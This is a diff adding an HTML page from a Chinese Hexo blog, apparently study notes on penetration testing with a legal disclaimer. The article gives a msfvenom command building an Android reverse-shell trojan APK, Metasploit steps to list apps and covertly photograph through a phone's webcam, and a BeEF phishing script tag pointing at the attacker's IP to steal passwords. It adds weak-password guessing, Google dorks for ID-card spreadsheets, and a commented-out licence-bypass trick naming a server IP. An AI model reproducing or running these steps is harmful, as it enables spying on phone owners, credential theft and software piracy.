@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="zh-Hans,en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="⚠️ 免责声明：本文仅为网络安全学习笔记，复现内容全部来自公开课程。任何未经系统所有者书面授权的渗透测试 &#x2F; 攻击行为都是违法的！ 请仅在合法授权的靶场、CTF 或自己的测试环境中练习。文中涉及的软件破解 &#x2F; 许可证绕过等做法可能违反相关法律与厂商协议，务必谨慎，仅供参考，请勿用于生产或商业环境。  手机木马病毒攻击实战什么是漏洞？ 漏洞：硬件或软件存在「安全上」的缺陷">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全-渗透测试与资产收集笔记">
+<meta property="og:url" content="http://example.com/en/2025/06/27/cybersecurity/%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="⚠️ 免责声明：本文仅为网络安全学习笔记，复现内容全部来自公开课程。任何未经系统所有者书面授权的渗透测试 &#x2F; 攻击行为都是违法的！ 请仅在合法授权的靶场、CTF 或自己的测试环境中练习。文中涉及的软件破解 &#x2F; 许可证绕过等做法可能违反相关法律与厂商协议，务必谨慎，仅供参考，请勿用于生产或商业环境。  手机木马病毒攻击实战什么是漏洞？ 漏洞：硬件或软件存在「安全上」的缺陷">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-06-27T07:00:48.933Z">
+<meta property="article:modified_time" content="2026-10-13T02:46:09.560Z">
+<meta property="article:author" content="UUOVO">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+
+    <meta name="keywords" content="网络安全, 渗透测试, 社会工程学, 资产收集">
+
+
+<title >网络安全-渗透测试与资产收集笔记</title>
+
+<!-- Favicon -->
+
+    <link href='/img/sitelogo16.svg?v=2.2.3' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/sitelogo32.svg?v=2.2.3' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/apple-touch-icon.png?v=2.2.3' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/swiper@4.5.1/dist/css/swiper.min.css">
+
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"UUOVO","root":"/","typed_text":["Web Developer"],"theme_version":"2.2.3","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"/img/sitelogo32.svg","icon16":"/img/sitelogo16.svg","icon32":"/img/sitelogo32.svg","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"10/30/2024 17:00:00","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":true,"el":".trm-banner"},"covers":["/img/cover/cover-1.jpg","/img/cover/cover-2.jpg","/img/cover/cover-3.jpg","/img/cover/cover-4.jpg","/img/cover/cover-5.jpg","/img/cover/cover-6.jpg","/img/cover/cover-7.jpg","/img/cover/cover-8.png","/img/cover/cover-9.png","/img/cover/cover-10.jpg","/img/cover/cover-11.jpg"],"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2026-10-13 10:46:09"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.3" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+ 
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/img/sitelogo32.svg">
+    
+    
+        <div class="trm-logo-text">
+            UU<span>OVO</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/tags/" target="">
+                            标签
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/" target="">
+                            微信小程序
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%B7%A5%E5%85%B7/" target="">
+                            前端工程化工具
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/react/" target="">
+                            React
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/vue/" target="">
+                            VUE
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/TypeScript/" target="">
+                            TypeScript
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/JavaScript/" target="">
+                            JavaScript
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/CSS-HTML/" target="">
+                            CSS&HTML
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" target="">
+                            网络与数据结构
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/uniapp/" target="">
+                            uniapp
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/threeJS/" target="">
+                            ThreeJS
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/Node/" target="">
+                            Node
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/JQuery/" target="">
+                            JQuery
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/es6/" target="">
+                            ES6
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/ajax/" target="">
+                            AJAX
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a  href="/categories/%E5%8F%AF%E8%A7%86%E5%8C%96/" target="">
+                            可视化
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/gallery/" target="">
+                    相册
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/gallery/wallpaper/" target="">
+                            相册详情页
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/about/" target="">
+                    关于
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/links/" target="">
+                            友链
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner slideshow cover-->
+    <div class="swiper-container trm-slideshow">
+        <div class="swiper-wrapper">
+            
+            <div class="swiper-slide">
+                <img style="object-position:top;object-fit:cover" src="https://pic.netbian.com/uploads/allimg/230124/002504-167449110430d8.jpg" alt="banner" class="trm-banner-cover top" data-swiper-parallax-y="-200" data-swiper-parallax-scale="1.2">
+            </div>
+            
+            <div class="swiper-slide">
+                <img style="object-position:top;object-fit:cover" src="https://img.shetu66.com/2023/07/04/1688440566649486.png" alt="banner" class="trm-banner-cover top" data-swiper-parallax-y="-200" data-swiper-parallax-scale="1.2">
+            </div>
+            
+            <div class="swiper-slide">
+                <img style="object-position:top;object-fit:cover" src="https://img.shetu66.com/2023/07/04/1688453333865029.png" alt="banner" class="trm-banner-cover top" data-swiper-parallax-y="-200" data-swiper-parallax-scale="1.2">
+            </div>
+            
+        </div>
+    </div>
+    <!-- banner slideshow cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            网络安全-渗透测试与资产收集笔记
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        en
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/img/avatar1.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        UUOVO
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/UUOVO" title="Github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://gitee.com/ovouu" title="Gitee" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-google"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                Residence:
+            </div>
+            <div class="trm-label trm-label-light">
+                Mars
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                City:
+            </div>
+            <div class="trm-label trm-label-light">
+                City
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                Age:
+            </div>
+            <div class="trm-label trm-label-light">
+                Age
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:1370203877@qq.com" class="trm-btn">
+            Contact Me
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            06/27
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            15:00
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            UUOVO
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <script src="/js/enChangegreen.js"></script>
+<link rel="stylesheet" type="text/css" href="/css/global.css">
+
+<blockquote>
+<p>⚠️ <strong>免责声明</strong>：本文仅为网络安全学习笔记，复现内容全部来自公开课程。<strong>任何未经系统所有者书面授权的渗透测试 &#x2F; 攻击行为都是违法的！</strong> 请仅在合法授权的靶场、CTF 或自己的测试环境中练习。文中涉及的软件破解 &#x2F; 许可证绕过等做法<strong>可能违反相关法律与厂商协议，务必谨慎，仅供参考，请勿用于生产或商业环境</strong>。</p>
+</blockquote>
+<h1 id="手机木马病毒攻击实战"><a href="#手机木马病毒攻击实战" class="headerlink" title="手机木马病毒攻击实战"></a>手机木马病毒攻击实战</h1><h2 id="什么是漏洞？"><a href="#什么是漏洞？" class="headerlink" title="什么是漏洞？"></a>什么是漏洞？</h2><ul>
+<li>漏洞：硬件或软件存在「安全上」的缺陷，攻击者可以直接访问或破坏系统。<ul>
+<li>举例：微信给你转 100 元，但实际收到 200 元。</li>
+<li>结论：金额数据被修改，数据安全存在问题，也叫数据漏洞。</li>
+<li>扩展：结构漏洞、管理漏洞（银行卡密码是生日）、逻辑漏洞。</li>
+<li>注意：这些漏洞不是功能上的问题，功能上的问题叫 bug。</li>
+</ul>
+</li>
+</ul>
+<h2 id="学习段位"><a href="#学习段位" class="headerlink" title="学习段位"></a>学习段位</h2><ul>
+<li>前提：任何未经别人授权的渗透测试或攻击都是违法的！！！</li>
+<li>王者段位：手写 POC &#x2F; EXP、代码审计、二进制、APK 逆向等。</li>
+<li>青铜段位：网络上提供了非常多现成的黑客攻击工具，开箱即用。</li>
+</ul>
+<h3 id="exploit-VS-kali"><a href="#exploit-VS-kali" class="headerlink" title="exploit VS kali"></a>exploit VS kali</h3><ul>
+<li>exploit &#x2F; exp（漏洞攻击）：系统上的攻击工具。</li>
+<li>kali：操作系统。</li>
+</ul>
+<h2 id="本次使用的工具"><a href="#本次使用的工具" class="headerlink" title="本次使用的工具"></a>本次使用的工具</h2><ul>
+<li>操作系统：Kali 系统（自带非常多的黑客攻击软件）。</li>
+<li>攻击软件：MSF 软件，又名「美少妇」（用于制作手机木马以测试学习）。</li>
+<li>攻击对象：安卓手机（不管是 iOS、鸿蒙还是安卓，攻击方式都一样）。</li>
+</ul>
+<h2 id="MSF-渗透手机操作指令"><a href="#MSF-渗透手机操作指令" class="headerlink" title="MSF 渗透手机操作指令"></a>MSF 渗透手机操作指令</h2><ol>
+<li>打开 MSF 软件：终端输入 <code>msfconsole</code><ul>
+<li>2230 exploits：MSF 内部集成了 2230 个漏洞攻击工具。</li>
+<li>867 payloads：MSF 内部集成了 867 个 payload 工具（有效攻击，攻击过程中造成的损失，如删除数据）。</li>
+</ul>
+</li>
+<li>制作木马：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=黑客电脑的IP地址 lport=黑客电脑的端口 R &gt; /home/kali/muma.apk</span><br></pre></td></tr></table></figure>
+<ul>
+<li>venom：毒液、木马、病毒。</li>
+<li><code>-p</code>：payload 的简称。</li>
+<li>攻击模块（安卓）：<code>android/meterpreter/reverse_tcp</code></li>
+<li>攻击模块（Windows）：<code>windows/meterpreter/reverse_tcp</code></li>
+<li>攻击模块（鸿蒙）：<code>harmony/meterpreter/reverse_tcp</code></li>
+<li>攻击模块（iOS）：?</li>
+<li><code>R &gt;</code>：另存为，输出并保存。</li>
+<li><code>/home/kali/muma.apk</code>：保存到的地址和生成的软件。</li>
+</ul>
+</li>
+<li>MSF 打开监听程序：<code>use exploit/multi/handler</code><ul>
+<li>允许其他电脑连接黑客电脑。</li>
+</ul>
+</li>
+<li>设置 payload 攻击：<code>set payload android/meterpreter/reverse_tcp</code></li>
+<li>设置攻击 IP 地址：<code>set lhost 黑客电脑的IP地址</code></li>
+<li>设置攻击端口：<code>set lport 黑客电脑的端口</code></li>
+<li>执行木马：<code>run</code><ul>
+<li>回车出现 <code>meterpreter &gt;</code>：表示有手机连接过来了（黑客电脑 — 建立连接 — 手机）。</li>
+<li><code>help</code>：查看可执行命令。</li>
+</ul>
+</li>
+<li>远程查看该手机的应用程序：<code>app_list</code><ul>
+<li>出现的名字乱码 —— 需要汉化处理。</li>
+<li>可以知道有哪些安装包（com.xxxxx）。</li>
+</ul>
+</li>
+<li>远程打开该手机的软件：<code>app_run 安装包</code></li>
+<li>在该手机黑屏的时候拍照<ul>
+<li>查看摄像头：<code>webcam_list</code></li>
+<li>拍照：<code>webcam_snap -l 1</code>（执行 1 号摄像头）</li>
+</ul>
+</li>
+</ol>
+<h3 id="漏洞的攻击流程-——-针对登录页面的攻击"><a href="#漏洞的攻击流程-——-针对登录页面的攻击" class="headerlink" title="漏洞的攻击流程 —— 针对登录页面的攻击"></a>漏洞的攻击流程 —— 针对登录页面的攻击</h3><ol>
+<li>进入社工网站 beef（账号密码为默认值）。</li>
+<li>获取目标对象的微信或手机号等。</li>
+<li>写一个钓鱼网站，如在网站的代码中写入：<code>&lt;script src=&quot;http://黑客电脑的IP地址:端口号/钓鱼代码文件&quot;&gt;&lt;/script&gt;</code></li>
+<li>发钓鱼短信，里面附带钓鱼网站链接。</li>
+<li>用户点击钓鱼链接后即被入侵。</li>
+<li>通过 beef 可以直观看到连接人的电脑或手机，右键 command 选择攻击工具执行。<ul>
+<li>如弹窗工具，弹窗提示输入账号密码等，用户输入后黑客即可获得账号密码。</li>
+</ul>
+</li>
+</ol>
+<h3 id="怎么找到某一家公司的资产？"><a href="#怎么找到某一家公司的资产？" class="headerlink" title="怎么找到某一家公司的资产？"></a>怎么找到某一家公司的资产？</h3><ul>
+<li>先通过企查查、天眼查等获取某一家公司的 ICP 之类的信息。</li>
+<li>再通过 fofa（“佛法”）检索这家公司，从获取的服务器链接点进去可以看到对应的登录页，再进行信息比对，尝试破解密码登录（手机号、二级域名、残留的测试账号、名字拼音等）。</li>
+<li>以上信息收集，用弱口令方式破解密码，培养思维。</li>
+<li>通过奇安信 <a target="_blank" rel="noopener" href="https://www.qianxin.com/">https://www.qianxin.com/</a> 使用命令可以获取这家公司的所有相关资产。</li>
+<li>网站目录扫描：分析网站使用什么语言。<ul>
+<li>扫描工具：<code>dirsearch</code><ul>
+<li>命令：<code>python dirsearch.py -u 扫描网站的网址 -e php,zip,bak</code><ul>
+<li>把扫描出来绿色的文件与网址一拼，可以在浏览器上看其内容。</li>
+<li>AI 只能辅助分析，Gemini：把绿色的文件夹拿去问 AI，问这个是什么。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>收集到足够的信息，然后采取针对性的攻击方式。</li>
+<li>在 Google 浏览器中搜索 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a> 里的命令，真的能找到一些表格和信息之类的，代表没有做脱敏。<ul>
+<li>如搜索 <code>filetype:xls 身份证</code>，可以找到网站中一些包含身份证的 xls 表格。</li>
+</ul>
+</li>
+</ul>
+<h2 id="揭秘黑客攻防网络世界的「天眼」攻击"><a href="#揭秘黑客攻防网络世界的「天眼」攻击" class="headerlink" title="揭秘黑客攻防网络世界的「天眼」攻击"></a>揭秘黑客攻防网络世界的「天眼」攻击</h2><ul>
+<li>现代攻击：社会工程学 + 技术。</li>
+</ul>
+<ol>
+<li>社会工程学？骗术！<ul>
+<li>引诱他人点击有木马的软件、视频、广告、链接等。</li>
+<li>如高考 → 志愿 → AI 志愿填报 + 技术，获取权限等信息。</li>
+<li>可以获取定位（seeker）、访问设备、IP 等信息。</li>
+</ul>
+</li>
+<li>WebRTC：开启视频通话的技术。</li>
+<li>隐藏摄像头方式：<ul>
+<li>弹窗欺骗 → 把通信弹窗变成 1px × 1px 的弹窗 → 幽灵窗口。</li>
+<li>浏览器推送通知。</li>
+</ul>
+</li>
+<li>反制<ul>
+<li>浏览器设置 →「隐私和安全」→ 检查获取权限的网址有哪些，把不认识的移除。</li>
+<li>物理防御：把摄像头遮住。</li>
+<li>批判性思维与零信任原则：遇到索要权限时，看有哪些权限不符合当前软件。</li>
+</ul>
+</li>
+</ol>
+<h3 id="挖洞、分析网址"><a href="#挖洞、分析网址" class="headerlink" title="挖洞、分析网址"></a>挖洞、分析网址</h3><ul>
+<li>网络安全人员 &#x2F; 黑客武器库 &#x2F; 木马库：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a></li>
+<li>360 漏洞响应平台：<a target="_blank" rel="noopener" href="https://src.360.net/home">https://src.360.net/home</a></li>
+<li>补天：<a target="_blank" rel="noopener" href="https://www.butian.net/">https://www.butian.net/</a></li>
+<li>fofa（佛法）：<a target="_blank" rel="noopener" href="https://en.fofa.info/">https://en.fofa.info/</a> （搜索方式：<code>country=&quot;JP&quot;</code> 可爬取某个国家所有被入侵的电脑）扫漏洞，然后去补天提交 —— 积累经验的途径。</li>
+<li>黑客之门：<a target="_blank" rel="noopener" href="https://www.hackerdoor.com/?c=click&id=141">https://www.hackerdoor.com/?c=click&amp;id=141</a></li>
+<li>钟馗之眼：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> （又叫暗黑搜索引擎，搜索全球的联网信息）</li>
+<li>SHODAN：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a> （国外的搜索引擎，如搜索 <code>webscan</code> 可以获得已知的摄像头，可以打开）</li>
+<li>cvedetails.com</li>
+</ul>
+<!-- ### 附：利用网络空间测绘工具免费用正版软件
+> ⚠️ 此做法可能违反软件许可协议与相关法律，仅作技术原理记录，强烈不建议实际使用。
+- 举例：PyCharm Pro 或者 JetBrains 全家桶。
+- 下载正版软件后，打开工具点击「管理许可证」。
+- 选择激活方式：许可证服务器。
+- 在 fofa 中搜索 `Location: https://account.jetbrains.com/fls-auth`，获得所有有许可证的服务器。
+- 回到激活页面去输入服务器即可激活。
+- （记录中提到的服务器：147.102.58.185:8888） -->
+
+<h3 id="积累经验途径"><a href="#积累经验途径" class="headerlink" title="积累经验途径"></a>积累经验途径</h3><ul>
+<li>漏洞挖掘</li>
+<li>7-9 月的护网</li>
+<li>CTF 竞赛</li>
+<li>外包项目</li>
+</ul>
+<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><ul>
+<li>0day：以前从来没有发现过的漏洞，系统底层漏洞，hard hard hard。</li>
+<li>Nday：别人已经发现过的漏洞，然后你从其他网站去找这种漏洞。</li>
+</ul>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            Other Articles
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/08/07/%E5%8F%AF%E8%A7%86%E5%8C%96/%E8%A7%86%E9%A2%91%E5%8D%8F%E8%AE%AE/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/cover/cover-1.jpg">
+                </span>
+                <h6 class="trm-op-title">视频协议</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/08/07</li>
+                <li>16:15</li>
+                <li>网络</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/06/24/react/React-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/cover/cover-1.jpg">
+                </span>
+                <h6 class="trm-op-title">React-组件通信方式</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/06/24</li>
+                <li>14:45</li>
+                <li>React</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024.10.30 - 2026</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">UUOVO</span>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.3.0
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                Theme - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.2.3
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        Article table of contents
+				<span id="post-toc-top">
+					TOP
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
